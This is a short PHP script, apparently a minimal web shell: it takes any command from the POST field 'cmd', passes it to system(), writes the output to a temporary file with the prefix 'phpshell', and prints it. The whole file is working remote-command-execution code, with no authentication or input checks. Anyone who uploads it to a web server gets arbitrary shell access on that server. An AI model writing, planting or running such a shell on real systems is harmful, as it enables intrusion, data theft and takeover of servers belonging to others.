<?php
$command = $_POST['cmd'];
echo "start";

if (!empty($command)){
	$tmpfile = tempnam('/tmp', 'phpshell');
	$command .= " 1> $tmpfile 2>&1; " .
	"cat $tmpfile; rm $tmpfile";
	system($command);
}

?>